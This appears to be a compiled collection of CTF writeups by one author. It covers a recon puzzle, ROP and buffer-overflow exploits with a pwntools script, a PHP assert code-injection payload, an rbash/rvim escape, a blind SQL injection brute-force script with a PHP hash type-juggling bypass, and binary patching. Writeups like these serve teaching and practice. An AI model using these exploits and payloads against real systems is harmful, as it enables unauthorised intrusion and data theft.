<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-birdsoup
description: CTF writeups and security challenges by birdsoup.
---

# Writeups by birdsoup

Source repository: `/repos/birdsoup`

## Repository Index

- CTF-Writeups/README.md
- CTF-Writeups/2018/Insomni'hack teaser/Rule86/README.md
- CTF-Writeups/2018/Insomni'hack teaser/VulnShop/README.md
- CTF-Writeups/2017/HackDatKiwi/MD5 Games 1/README.md
- CTF-Writeups/2017/CSAW/tableEz/README.md
- CTF-Writeups/2017/BackdoorCTF/The-Wall/README.md
- CTF-Writeups/2017/BKP/vimjail/README.md
- CTF-Writeups/2016/CSAW/Fuzyll/README.md
- CTF-Writeups/2016/CSAW/Tutorial/README.md
- CTF-Writeups/2016/CSAW/Warmup/README.md
- CTF-Writeups/2016/CSAW/mfw/README.md

## Writeup Content


### File: CTF-Writeups/2016/CSAW/Fuzyll/README.md

![description](images/description.png)

Stage 1: http://fuzyll.com/files/csaw2016/start
This site gives the hint:
CSAW 2016 FUZYLL RECON PART 1 OF ?: People actually liked last year's challenge, so CSAW made me do it again... Same format as last year, new stuff you need to look up. The next part is at /csaw2016/<the form of colorblindness I have>.

For this stage I googled "fuzyll color blind" and found fuzyll's blog where he says he has Deuteranomaly:
![fuzyll blog](images/fuzyllblog.png)

Stage 2: http://fuzyll.com/files/csaw2016/deuteranomaly
![part 2](images/part2.png)
This page presents us with a picture of strawberries, looking at the exif data tells us the next stage.

Stage 3:
CSAW 2016 FUZYLL RECON PART 2 OF ?: No, strawberries don't look exactly like this, but it's reasonably close. You know what else I can't see well? /csaw2016/&lt;the first defcon finals challenge i ever scored points on

Googling "fuzyll linkedin" will find his linkedin page, which lists which defcons he has competed in.
The earliest on the list was defcon 19
![fuzyll linkedin](images/linkedin.png)

To see if I could find which challenges he did, I googled "fuzyll defcon challenges" which brought me to a vm of defcon challenges he compiled:
http://fuzyll.com/2016/the-defcon-ctf-vm/

The github page has challenges sorted by year, after trying all the challenge names for defcon 19, I found that 'tomato' was the solution

Stage 4: http://fuzyll.com/files/csaw2016/tomato

This page presents us with the text:
ÃâÁæ@òðñö@ÆäéèÓÓ@ÙÅÃÖÕ@×ÁÙã@ó@–†@oz@É@„–•}£@…¥…•@“‰’…@£–”£–…¢Z@Á•¨¦¨k@–¤£¢‰„…@–†@ÃãÆ¢k@É}¥…@‚……•@—“¨‰•‡@@†‰™@”–¤•£@–†@æ–™“„@–†@æ™Ã™†£@–¥…™@£ˆ…@—¢£@¨…™@M•…¥…™@£ˆ–¤‡ˆ£@É}„@‚…@¢¨‰•‡@£ˆ£@†£…™@Ã£ƒ“¨¢”k@‚¤£@ˆ…™…@¦…@™…]K@ãˆ…@•…§£@—™£@‰¢@£@aƒ¢¦òðñöaL”¨@”‰•@æ–æ@ƒˆ™ƒ£…™}¢@•”…nK

I assumed this was some sort of weird encoding, so I looked for encoding detectors online and found the "Universal Cyrillic decoder":
![encoding detector](images/encoding.png)
looking through all of their possible encodings revealed the solution.

Stage 5:
CSAW 2016 FUZYLL RECON PART 3 of ?: I don't even like tomatoes! Anyway, outside of CTFs, I've been playing a fair amount of World of WarCraft over the past year (never thought I'd be saying that after Cataclysm, but here we are). The next part is at /csaw2016/<my main WoW character's name>.

Googling "fuzyll world of warcraft" found this site on his blog:
http://fuzyll.com/2015/blackfathom-deep-dish/

I found this guild on the WoW armory, and sorted the roster by rank, the guild master is "elmrik", which is the solution to this stage.

Stage 6:
The page gives us some ruby code:
~~~~
#!/usr/bin/env ruby

CHARS = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "B", "C", "D",
         "F", "G", "H", "J", "K", "L", "M", "N", "P", "Q", "R", "S", "T",
         "V", "W", "X", "Y", "Z", "b", "c", "d", "f", "g", "h", "j", "k",
         "l", "m", "n", "p", "q", "r", "s", "t", "v", "w", "x", "y", "z"]

def encode(string)
    input = string.bytes.inject {|x, y| (x << 8) + y }
    output = ""
    while input > 0
        output = CHARS[input % 52].to_s + output
        input /= 52
    end
    return output
end

def decode(input)
    # your implementation here
end

message = "JQSX2NBDykrDZ1ZHjb0BJt5RWFkcjHnsXvCQ4LL9H7zhRrvVZgLbm2gnXZq71Yr6T14tXNZwR1Dld2Y7M0nJsjgvhWdnhBll5B8w0VP3DFDjd3ZQBlcV4nkcFXBNzdPCSGMXQnQ7FTwcwbkG6RHX7kFHkpvgGDDGJvSDSTx7J6MFhRmTS2pJxZCtys4yw54RtK7nhyW6tnGmMs1f4pW6HzbCS1rSYNBk3PxzW9R1kJK54R2b7syLXd7x1Mr8GkMsg4bs3SGmj3rddVqDf4mTYq1G3yX1Rk9gJbj919Jw42zDtT2Jzz4gN0ZBmXPsBY9ktCLPdFrCPZ33NKJy5m37PK0GLXBxZz9k0cjzyt8x199jMsq7xrvNNgDNvgTbZ0xjZzHhkmrWrCmD7t4q4rWYFSJd4MZBxvnqc0VgGzdkq8jSJjnwcynq9VfH22WCQSdPKw48NkZL7QKGCT94pSb7ZSl2G6W37vBlW38q0hYDVcXTTDwr0l808nDPF6Ct1fPwKdNGKbRZ3Q3lHKMCYBC3w8l9VRjcHwMb1s5sMXM0xBvF8WnWn7JVZgPcXcwM2mDdfVkZsFzkrvVQmPfVNNdk9L5WtwDD8Wp9SDKLZBXY67QkVgW1HQ7PxnbkRdbnQJ4h7KFM2YnGksPvH4PgW2qcvmWcBz62xDT5R6FXJf49LPCKL8MQJLrxJpQb7jfDw0fTd00dX1KNvZsWmfYSTl1GxPlz1PvPSqMTQ036FxSmGb6k42vrzz2X90610Z"
puts decode(message)
~~~~

The encode method keeps a running sum of each char, shifting the sum to the left 8 bits before each add.
the sum is then looped over, creating a string from the CHARS array

My script to decode it:
~~~~
def decode(input)
    index = 0
    output = CHARS.index(input[0])

    while index < input.length
        char = input[index]
        output *= 52
        output += CHARS.index(input[index])
        index += 1
    end

    index = 0
    final = ""
    while true
        final = ((output >> 8 * index) & 0xFF).chr + final
        output -= (output >> 8 * index) & 0xFF
        if (output >> (8 *index)) <= 0
            return final
        end
        index += 1
    end
    return final
    # your implementation here
end
~~~~

This doesn't work completely, but it works well enough to get to the next stage.

Stage 7:
On stream, after one of these big upsets in Smash 4, you can see me in the crowd with a shirt displaying my main character! The next part is at /csaw2016/<the winning player's tag>.

I googled "Biggest smash 4 upsets" and found a video, and just tried the tags of all the players in it, the answer is jade
![smash 4 video](images/smash4.png)

Stage 8: http://fuzyll.com/files/csaw2016/jade
This page sends you a file called "jade".
Running 'file' on it says that it's gzipped, gunzipping it gives you an image.
Checking the exif data on the image brings you to the next stage.
![jade](images/jade.png)

Stage 9:
CSAW 2016 FUZYLL RECON PART 5 OF 6: I haven't spent the entire year playing video games, though. This past March, I spent time completely away from computers in Peru. This shot is from one of the more memorable stops along my hike to Machu Picchu. To make things easier on you, use only ASCII: /csaw2016/<the name of these ruins>.

google image search says that the image is of Winay Wayna

Stage 10: http://fuzyll.com/files/csaw2016/winaywayna
This page gives us the flag:
CSAW 2016 FUZYLL RECON PART 6 OF 6: Congratulations! Here's your flag{WH4T_4_L0NG_4ND_STR4NG3_TRIP_IT_H45_B33N}.



### File: CTF-Writeups/2016/CSAW/Tutorial/README.md

![description](images/description.png)

This challenge provides an executable and a libc.so file.

Running this file causes a segfault, so lets look at it in IDA:

![First ida view](images/ida1.png)

The file expects us to pass an argument designating the port number to listen on.

running the program with argument 8000 will still have some errors: to get it working fully you have to fix the errors that it lists (making a user named tutorial, making a home directory for the user, etc)

Once this setup is done, we can run the program locally for testing.
I could only get the program to run as root (probably not the safest thing to do, but I didn't feel like fixing the permission errors I was getting)

running sudo ./tutorial 8001 in one terminal then nc 127.0.0.1 8001 in another terminal lets us connect to the service:
![first run](images/first_run.png)

There are 3 menu options:

1. Manual: this prints some address out, if this is a leak in libc, we can use this address and the given libc to get the address of anything in libc

2. This prompts you to enter your exploit, this is probably where we should look for a vulnerability

3. Quit: quits the program

At this point, I decided to look at the 'menu' function from the binary in IDA:
![menu function in IDA](images/menu.png)

We can see that func2 is called if '2' is input at the menu, and func1 is called if '1' is input.

Lets see what option 1 does:
![func1 in IDA](images/func1.png)

Here we can see that the function gets the address of the symbol "puts" in the current process, and prints this address - 1280.

Since we now know the address of puts in memory, we can get around ASLR to find the address of anything in libc:
address of thing in process = leaked address + 1280 - offset of puts + offset of thing we're finding in libc

To find offsets of a symbol in libc, you can open the given libc file in ida; its address in ida is its offset.

Now lets look at func2:
![func2 in IDA](images/func2.png)

This function has a clear buffer overflow: it reads 0x1cc bytes of input into a buffer at [bp - 140h]

The only thing in the way of a buffer overflow exploit is the stack canary:
![stack canary](images/canary.png)

Looking at the disassembly shows us that the stack canary is found at ebp - 8
In order to succesfully exploit the system, we need to find the stack canary's value and include it at the right place in our exploit so that it is not modified by our buffer overflow

Luckily for us, the stack canary is printed by the write() call at the end of the function. (It outputs 0x144 bytes starting at bp - 0x140, the canary is found at bp - 8)

So we can simply enter nothing as input to func 2, read the stack canary from the output, and then call func2 again with our real exploit.

The Exploit:
In order to exploit this vulnerability, we will need to use ROP.
We can get the address of system() using the leaked memory address and offsets from libc-2.19.so 
We can also get the address of the string "/bin/sh" found libc-2.19.so.
If we can load "/bin/sh" into rdi, then return to system(), we can get a shell on the server.

The easiest way to get "/bin/sh" into rdi is to include its address into our input, then pop it into rdi using a rop gadget. To find gadgets for this exploit, I used radare2:
![finding gadget in radare](images/r2.png)

If we overwrite the return address (rbp + 8) with the address of this gadget, put the address of "/bin/sh" in rbp + 16, and put the address of system into rbp + 24, func2 will return to the gadget, pop
"/bin/sh" into rdi, then return into system, executing /bin/sh.

The exploit now looks like this:
"A" * (0x140 - 8) + stack canary + [8 bytes of filler] + pop_rdi_ret_gadget + bin_sh + system

Writing up this exploit spawns a shell from the service, but we can't interact with it. This is because system connects the input and output of /bin/sh to file descriptors 0 and 1 respectively, of the parent process. Since we are passing input and output through a different file descriptor (for the socket being used), we can't interact with the shell we launched.

In order to interact with the shell we create, we need to replace file descriptors 0 and 1 with the descriptor for the socket we're communicating through.

To do this, we must call close(0) and close(1) to close the file descriptors for stdin and stdout
We can then call dup(socket fd) twice to create file descriptors 0 and 1 that use our socket.

We can get the address of close and dup the same way we got the addresses of the other libc functions.

To find the socket being used, I launched the program in gdb, then looked at its open file descriptors in /proc/\<pid\>/fd/
![gdb output](images/gdb.png)
To do this, simply set a breakpoint anywhere after the socket is created, and look at its file descriptors.

We can see from /proc/\<pid\>/fd that the socket has file descriptor 4.

Now our exploit looks like this:

(0x140 - 8) bytes of filler + stack_canary + 8 bytes of filler + pop_rdi_ret gadget + 0 + address of close + pop_rdi_ret gadget + 1 + address of close + pop_rdi_ret gadget + socket_fd number + address of dup + address of dup + pop_rdi_ret address + bin_sh address + system address

This will bypass the stack canary, call close(0), call close(1), call dup(4) twice, then call system("/bin/sh")

An example of the final exploit can be found in tutorial.py

![running the exploit](images/flag.png)

And we're done!
Flag : FLAG{3ASY_R0P_R0P_P0P_P0P_YUM_YUM_CHUM_CHUM}




### File: CTF-Writeups/2016/CSAW/Warmup/README.md

![description](images/description.png)

The challenge provides us with a binary "warmup".
Running this binary prints a hex value, then takes user input.
![program test](images/test.png)

Opening it in ida shows that it is printing the address of some symbol named "easy":
![main in ida](images/main.png)

Lets see what this 'easy' symbol is:
![easy](images/easy.png)

The function 'easy' simply prints out the flag to us.

Looking back at the main method, the part that takes in user input is vulnerable to buffer overflow.
The buffer that it writes into is located at [bp - 40h], so anything past 0x40 bytes will overwrite other info.

If you are not familiar with the x86 stack frame layout, http://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64 has some good diagrams.
In short, the return address of our current function is stored at RBP + 8. If we overwrite this 
return address with the address of 'easy', the main function will return into easy, and will print
the flag for us.

I threw together a quick python script to run this exploit:
~~~
#pwntools provides many tools for exploitation challenges
from pwn import *

#establish a connection to the server running the "warmup" binary
r = remote('pwn.chal.csaw.io', 8000)

#receive the first message, which containts the address of 'easy'
msg = r.recv()
lines = msg.split('\n')

#slice the second line of the server message to get the address it sent and convert it to an integer
address = int(lines[1][4:],16)

#sends enough A's to fill the buffer up to the location of the return address, followed by the address of 'easy' that was leaked to us earlier
r.sendline("A" * (0x40 + 8) + p64(address))

#print the server response
print(r.recv())
~~~
Running this gives the flag:
![flag](images/flag.png)





### File: CTF-Writeups/2016/CSAW/mfw/README.md

![description](images/description.png)

The challenge contains a link to a website:
![site index](images/website.png)

Going to the about tab reveals that the site uses PHP and git.
![about page](images/about.png)

The server has it's git directory public available:
![git directory](images/git.png)

I used https://github.com/evilpacket/DVCS-Pillage to download the git directory contents:

`./gitpillage.sh http web.chal.csaw.io:8000/`

This gives access to the source of index.php:
~~~~
<?php

if (isset($_GET['page'])) {
	$page = $_GET['page'];
} else {
	$page = "home";
}

$file = "templates/" . $page . ".php";

// I heard '..' is dangerous!
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");

// TODO: Make this look nice
assert("file_exists('$file')") or die("That file doesn't exist!");

?>
<!DOCTYPE html>
<html>
	<head>

        [irrelevant html stuff]...

		<div class="container" style="margin-top: 50px">
			<?php
				require_once $file;
			?>
			
		</div>
		
		<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.12.4/jquery.min.js" />
		<script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js" />
	</body>
</html>
~~~~

After trying various ways to sneak '..' into the url, I remembered that assertions are generally not advised to be used in production code (at least in Python and PHP), so I looked up the php docs on assertions. It turns out that the string passed to the assert is evaluated as php code, meaning that we can inject code using the $page parameter.

After a lot of testing I came up with the solution:
~~~~
http://web.chal.csaw.io:8000?page=', '..') === false and $myfile = fopen("templates/flag.php", "r") and exit(fread($myfile,filesize("templates/flag.php"))) or true or strpos('
~~~~

When evaluated by index.php, the first assert becomes:
~~~~
assert("strpos('templates/', '..') === false and $myfile = fopen("templates/flag.php", "r") and exit(fread($myfile,filesize("templates/flag.php"))) or true or strpos('.php', '..') === false") or die("Detected hacking attempt!");
~~~~
This gets past the first assert, opens the flag.php file, and exits, printing its contents before the assertion fails.
![flag](images/flag.png)





### File: CTF-Writeups/2017/BKP/vimjail/README.md

![description](images/description.png)

Upon connecting to the server, I tried running ls and saw that there's a flagReader file.

By trying to run it, we see that we're in a restricted environment and the error messages show that we're running in rbash.
![rbash output](images/rbash.png)

To escape rbash you can run the following in vim:
~~~~
:set shell=/bin/sh
:shell
~~~~

Lets see if there's setuid on the flagReader file:
~~~~
$ ls -al flagReader
---S--x--- 1 topsecretuser secretuser 8768 Feb 25 08:42 flagReader
~~~~
flagReader is executable by secretuser, so lets try to find a way to execute things as secretuser:

First I tried listing all files that are setuid to run as secretuser:
~~~~
find / -user secretuser -perm -4000 -exec ls -ldb {} \; 2> /dev/
~~~~

apparently no other binary will allow us to run as secretuser

Now lets see if there's anything that sudo will allow us to run with higher privileges:
~~~~
$ sudo -l
Matching Defaults entries for ctfuser on
    ip-172-31-31-196.us-west-2.compute.internal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ctfuser may run the following commands on
        ip-172-31-31-196.us-west-2.compute.internal:
    (ALL) NOPASSWD: /usr/bin/sudo -l
    (secretuser) NOPASSWD: /usr/bin/rvim
~~~~
So this means we can run rvim as secretuser:
~~~~
$ sudo -u secretuser rvim
~~~~
rvim doesn't allow you to run shell commands, so we can't use the same shell spawning technique as before. However, rvim does allow you to run python code. Because of this we can just execute flagReader with python: 
~~~~
:py3 import subprocess
:py3 print(subprocess.check_output(['/home/ctfuser/flagReader']))
~~~~
and we get the flag:
~~~~
flag{rVim_is_no_silverbullet!!!111elf}
~~~~
![flag](images/flag.png)


### File: CTF-Writeups/2017/BackdoorCTF/The-Wall/README.md

![description](images/description.png)

We're given the link to a login form, and the name of the user that we're trying to log in as. On the login page, we're given the source code for the login feature.

![login page](images/page.png)

```php

<html>
<head>
<title>The Wall</title>
</head>
<body>
<?php
include 'flag.php';

if(isset($_REQUEST['life'])&&isset($_REQUEST['soul'])){
    $username = $_REQUEST['life'];
    $password = $_REQUEST['soul'];

    if(!(is_string($username)&&is_string($password))){
        header( "refresh:1;url=login.html");
        die("You are not allowed south of wall");
    }

    $password = md5($password);
    
    include 'connection.php';
    /*CREATE TABLE IF NOT EXISTS users(id INTEGER PRIMARY KEY AUTOINCREMENT,username TEXT,password TEXT,role TEXT)*/

    $message = "";
    if(preg_match('/(union|\|)/i', $username)){
        $message="Dead work alone not in UNIONs"."</br>";
        echo $message;
        die();
    }
    $query = "SELECT * FROM users WHERE username='$username'";
    $result = $pdo->query($query);
    $users = $result->fetchArray(SQLITE3_ASSOC);

    if($users) {
        if($password == $users['password']){
            if($users['role']=="admin"){
                echo "Here is your flag: $flag";
            }elseif($users['role']=="normal"){
                $message = "Welcome, ".$users['users']."</br>";
                $message.= "Unfortunately, only Lord Commander can access flag";
            }else{
                $message = "What did you do?";
            }
        }
        else{
            $message = "Wrong identity for : ".$users['username'];
        }

    }
    else{
        $message = "No such person exists"."<br>";
    }
    echo $message;
}else{
    header( "refresh:1;url=login.html");
    die("Only living can cross The Wall");
}
?>

</body>
</html>

```

By looking at the php, we can see that there's a classic example of an SQL injection vulnerability in the following code:

```php
    $query = "SELECT * FROM users WHERE username='$username'";
    $result = $pdo->query($query);
    $users = $result->fetchArray(SQLITE3_ASSOC);
```

If we insert a username containing a ', we can end the where clause and insert our own SQL commands into the query.

Normally at this point, I'd try to pull information out of the database using the UNION command, but the php code filters any form of "union" in the input, so we need to find a different way.

By messing around with the login form and looking at the source code, we noticed that we get different outputs depending on whether or not the SELECT statement returned at least 1 user. When the SELECT statement finds a user, and we give the wrong password, we get an output of "Wrong identity for : ".$users['username'], but when we don't find a valid user we get an output of "No such person exists". As such, we can insert code into the SQL query that will cause the SELECT to only return a user conditional on some information about their password. 

The way we did this is by adding onto the WHERE clause: we used a username of the form "LordCommander' AND password LIKE 'a%", in order to find whether or not the password starts with an a (the % sign in SQL is a wildcard character, so a% matches any string starting with an a). When inserted into the SQL query string, the query becomes: 

```sql
"SELECT * FROM users WHERE username='LordCommander' AND password LIKE 'a%'"
```

This test can be done for all of the characters in the set "01234567890abcdef" (since the stored value is an md5 hash) to find what character the password starts with, and this process can be repeated for every character of the password. Since we only have to guess 16 times at most per character of the password, this can be done very quickly.

To automate this, we wrote a quick python script that uses the requests library to interact with the website:

```python
import requests
import string

url = 'http://163.172.176.29/WALL/index.php'

response = ''
sofar = ''
while True:
    done = 1
    for char in "0123456789abcdef":
        print(char)
        params = {'life':'LordCommander\' AND password LIKE \''+ sofar + char + '%', 'soul':''}
        r = requests.post(url, data=params)

        if "Wrong identity" in r.text:
            sofar += char
            print("sofar=", sofar)
            done = 0
            break
    if done == 1:
        break
print sofar

```

Running the script gets us the md5 hash of the password: 0e565041023046045310587974628079

Running the hash through online hash crackers doesn't find anything. By looking back at the source code, we can see that the hashes are compared with the == operator:

```php
if($password == $users['password'])
```

The double equals operator is notoriously bad, and there's a fairly well known vulnerability with the operator in that two strings starting with "0e" will always compare as true. This is because the == operator does automatic type casting, and considers strings of the form "0exxxxxx" to be the same as the integer 0 * e^{xxxxxx}. Therefore when two strings starting with "0e" are compared, they both get casted to the integer 0, and the comparison will always evaluate to true.

By googling "0e php hash vulnerability", we can find another string whose hash starts with "0e" (I used the string "240610708"). By entering this as the password, we'll get past the password check, and will log in as the admin. We were given the flag on the admin page.


### File: CTF-Writeups/2017/CSAW/tableEz/README.md

![description](images/description.png)

The challenge gives us a binary to analyze.

Here's the decompiled main method of the program in IDA:

![main code](images/main.png)

From this, we can see that the program reads our input, and then replaces every character of the input with the result of a call to get_tbl_entry. After the input is done being transformed, it compares the result to some constant string defined in the program (the string stored in s2 in the decompiled code).

Lets see what the get_tbl_entry function is doing to our input:

![get_tbl_entry code](images/get_tbl_entry.png)

From this code, we can see that every time the function is called, it loops through a table until it finds our input, and then returns the corresponding item from the byte_201281 array. Lets see how these tables are stored:

![table](images/table.png)

From this we can see that the byte_201281 array is the same table as trans_tbl, just offset by one. This means that every time a character of our input is found in the table, the function returns the next entry in the table. This can be easily reversed by simply copying the final string that our transformed input is compared against in main, and then doing the opposite of the table lookups on it (find each character of the final output, find it in the table, and return the value before it). 

Another way of doing this is by patching the program to invert the functionality of get_tbl_entry. If we change the code to instead find the entry in the byte_201281 array, and then return the element before it in the table, we can simply enter the final string that our transformed input is compared against, and the program will decode it for us.

![get_tbl_entry dissassembly](images/get_tbl_entry_dasm.png)

From the disassembly, we can see that the addresses of trans_tbl and the byte_201281 array are loaded during instructions at addresses 0x865 and 0x87d respectively. If we patch the instruction that loads trans_tbl to instead load trans_tbl + 1, and the instruction that loads byte_201281 to instead load byte_201281 - 1, the functionality of get_tbl_entry will be reversed.

To do this, I patched the program in radare2.

```
default@CTF:~/Desktop/Repos/CTF_WRITEUPS_NEW/CTF-Writeups/2017/CSAW/tableEz$ cp tablez tablez_patched
default@CTF:~/Desktop/Repos/CTF_WRITEUPS_NEW/CTF-Writeups/2017/CSAW/tableEz$ r2 -Aw tablez_patched
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[ ] [*] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan))
 -- Using radare2 to generate intelligence ...
[0x00000740]> 0x865
[0x00000865]> pdf
/ (fcn) sym.get_tbl_entry 86
|           ; arg int arg_2h @ rbp+0x2
|           ; arg int arg_feh @ rbp+0xfe
|           ; var int local_8h @ rbp-0x8
|           ; var int local_14h @ rbp-0x14
|           ; CALL XREF from 0x0000098f (sym.main)
|           0x0000084a      55             push rbp
|           0x0000084b      4889e5         mov rbp, rsp
|           0x0000084e      89f8           mov eax, edi
|           0x00000850      8845ec         mov byte [rbp - local_14h], al
|           0x00000853      48c745f80000.  mov qword [rbp - local_8h], 0
|       ,=< 0x0000085b      eb32           jmp 0x88f
|       |   ; JMP XREF from 0x00000897 (sym.get_tbl_entry)
|      .--> 0x0000085d      488b45f8       mov rax, qword [rbp - local_8h]
|      ||   0x00000861      488d1400       lea rdx, [rax + rax]
|      ||   0x00000865      488d05140a20.  lea rax, [rip + 0x200a14]   ; 0x201280 ; obj.trans_tbl ; obj.trans_tbl
|      ||   0x0000086c      0fb60402       movzx eax, byte [rdx + rax]
|      ||   0x00000870      3845ec         cmp byte [rbp - local_14h], al ; [0x2:1]=76
|     ,===< 0x00000873      7515           jne 0x88a
|     |||   0x00000875      488b45f8       mov rax, qword [rbp - local_8h]
|     |||   0x00000879      488d1400       lea rdx, [rax + rax]
|     |||   0x0000087d      488d05fd0920.  lea rax, [rip + 0x2009fd]   ; 0x201281
|     |||   0x00000884      0fb60402       movzx eax, byte [rdx + rax]
|    ,====< 0x00000888      eb14           jmp 0x89e
|    ||||   ; JMP XREF from 0x00000873 (sym.get_tbl_entry)
|    |`---> 0x0000088a      488345f801     add qword [rbp - local_8h], 1
|    | ||   ; JMP XREF from 0x0000085b (sym.get_tbl_entry)
|    | |`-> 0x0000088f      48817df8fe00.  cmp qword [rbp - local_8h], 0xfe ; [0xfe:8]=0x2010000000
|    | `==< 0x00000897      76c4           jbe 0x85d
|    |      0x00000899      b800000000     mov eax, 0
|    |      ; JMP XREF from 0x00000888 (sym.get_tbl_entry)
|    `----> 0x0000089e      5d             pop rbp
\           0x0000089f      c3             ret
[0x00000865]> 
```

We can see that the existing instruction is lea rax, [rip + 0x200a14]. So to patch this, we should instead load [rip + 0x200a15], which is 1 byte higher in the address space. For some reason r2 uses rip-based addressing by default when writing instructions, we we can simply write the instruction lea rax, [0x200a15]. We can also do the same at address 0x87d by changing the instruction to lea rax, [0x2009fc]. 

```
[0x00000865]> wa lea rax, [0x200a15]
Written 7 bytes (lea rax, [0x200a15]) = wx 488d05150a2000
[0x00000865]> 0x87d
[0x0000087d]> wa lea rax, [0x2009fc]
Written 7 bytes (lea rax, [0x2009fc]) = wx 488d05fc092000
```

Now we need to get the string that we want to decode back into the flag. By looking at the disassembly, we can see the area in the code where the string is being loaded into the buffer:

![string contents](images/string_info.png)

Since the values are little endian, we can just copy the byte contents in reverse to get the string. I wrote the string to a file to make it easier to use as input to the program:

```bash
echo $'\x27\xb3\x73\x9d\xf5\x11\xe7\xb1\xb3\xbe\x99\xb3\xf9\xf9\xf4\x30\x1b\x71\x99\x73\x23\x65\x99\xb1\x65\x11\x11\xbe\x23\x99\x27\xf9\x23\x99\x05\x65\xce' > test_input.txt
```

I then debugged the program with GDB to set a breakpoint on the code after our string is decoded, so that I can read the result out of memory. By looking at the disassembly, we can see that, after the string gets decoded, the length will be checked at address 0x9c1, so I decided to set a breakpoint there to read the decoded string.


GDB rebased the program (loading the program at address 0x555555554000), so I found where main was located to find out how much I should offset the address 0x9c1 by to get its new location.

```
default@CTF:~/Desktop/Repos/CTF_WRITEUPS_NEW/CTF-Writeups/2017/CSAW/tableEz$ gdb tablez_patched 

gdb-peda$ r
Starting program: /home/default/Desktop/Repos/CTF_WRITEUPS_NEW/CTF-Writeups/2017/CSAW/tableEz/tablez_patched 
Please enter the flag:
^C
Program received signal SIGINT, Interrupt.

gdb-peda$ info addr main
Symbol "main" is at 0x5555555548a0 in a file compiled without debugging.

gdb-peda$ b *0x5555555549c1
Breakpoint 1 at 0x5555555549c1

gdb-peda$ r  < test_input.txt
Starting program: /home/default/Desktop/Repos/CTF_WRITEUPS_NEW/CTF-Writeups/2017/CSAW/tableEz/tablez_patched < test_input.txt
Please enter the flag:
[----------------------------------registers-----------------------------------]
RAX: 0x25 ('%')
RBX: 0x0 
RCX: 0x7d ('}')
RDX: 0x7fffffffd800 ("flag{t4ble_l00kups_ar3_b3tter_f0r_m3}")
RSI: 0x555555756446 --> 0x0 
RDI: 0xffffffce 
RBP: 0x7fffffffd890 --> 0x555555554a40 (<__libc_csu_init>:  push   r15)
RSP: 0x7fffffffd7c0 --> 0x25 ('%')
RIP: 0x5555555549c1 (<main+289>:    cmp    QWORD PTR [rbp-0xc8],0x25)
R8 : 0xc0e0 
R9 : 0x0 
R10: 0x309 
R11: 0x7ffff7a98720 (<strlen>:  pxor   xmm0,xmm0)
R12: 0x555555554740 (<_start>:  xor    ebp,ebp)
R13: 0x7fffffffd970 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5555555549b1 <main+273>:   mov    rax,QWORD PTR [rbp-0xd0]
   0x5555555549b8 <main+280>:   cmp    rax,QWORD PTR [rbp-0xc8]
   0x5555555549bf <main+287>:   jb     0x555555554976 <main+214>
=> 0x5555555549c1 <main+289>:   cmp    QWORD PTR [rbp-0xc8],0x25
   0x5555555549c9 <main+297>:   je     0x5555555549de <main+318>
   0x5555555549cb <main+299>:   lea    rdi,[rip+0x109]        # 0x555555554adb
   0x5555555549d2 <main+306>:   call   0x555555554700 <puts@plt>
   0x5555555549d7 <main+311>:   mov    eax,0x1
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffd7c0 --> 0x25 ('%')
0008| 0x7fffffffd7c8 --> 0x25 ('%')
0016| 0x7fffffffd7d0 --> 0xb1e711f59d73b327 
0024| 0x7fffffffd7d8 --> 0x30f4f9f9b399beb3 
0032| 0x7fffffffd7e0 --> 0xb19965237399711b 
0040| 0x7fffffffd7e8 --> 0xf9279923be111165 
0048| 0x7fffffffd7f0 --> 0xce65059923 
0056| 0x7fffffffd7f8 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x00005555555549c1 in main ()
gdb-peda$ 
```
Then we can see that the flag has been decoded (in this case it happens to be stored in rdx).


### File: CTF-Writeups/2017/HackDatKiwi/MD5 Games 1/README.md

We're given the following source code:
```php
<?php
if (isset($_GET['src']))
    highlight_file(__FILE__) and die();
if (isset($_GET['md5']))
{
    $md5=$_GET['md5'];
    if ($md5==md5($md5))
        echo "Wonderbubulous! Flag is ".require __DIR__."/flag.php";
    else
        echo "Nah... '",htmlspecialchars($md5),"' not the same as ",md5($md5);
}

?>
<p>Find a string that has a MD5 digest equal to itself!</p>
<form>
    <label>Answer: </label>
    <input type='text' name='md5' />
    <input type='submit' />
</form>

<a href='?src'>Source Code</a>
```
We see that the md5's are compared with == instead of ===, which makes them vulnerable to type juggling vulnerabilities. 
In particular, if two strings both start with "0e" and contain numbers afterward, the == operator will always return that they're true. (Both get casted to integers of the form 0 * e ^{the remaining string}, so it returns 0 == 0).

To solve this, I just wrote a quick PHP script to generate strings of this form until one hashed to a hash of this form.

```php
<?php
echo "running script";
 $base = "0e";
 $result = "";
 $curr_number = 0; 
 do {
  $curr = $base . "$curr_number";
  $result = md5($curr);
  $curr_number += 1;
  }
 while ($curr == $result);
echo "\n";
echo $curr;
echo "\n";
echo $result;
echo "\n";
```

After leaving this running for a few minutes, it finds a solution, which gives us the flag when entered on the page.



### File: CTF-Writeups/2018/Insomni'hack teaser/Rule86/README.md

![description](images/description.png)

# Getting Started:

We're given a link to an archive containing 4 files: 

* hint.gif.enc
* rule86.txt
* rule86.txt.enc
* super_cipher.py.enc

Each of these files is included in this the `sample_files` folder in this repo: [Link](./sample_files/)

The only readable file is rule86.txt, but it just contains nonsense.

As stated in the challenge description, the provided `*.enc` files were encrypted with a synchronous stream cipher.


# Stream Ciphers

In a synchronous stream cipher, a key stream is generated with a pseudorandom number generator, and the generated stream of bytes is xored with the message to get the ciphertext. 

In this scheme, the PRNG is parameterized by a secret key.

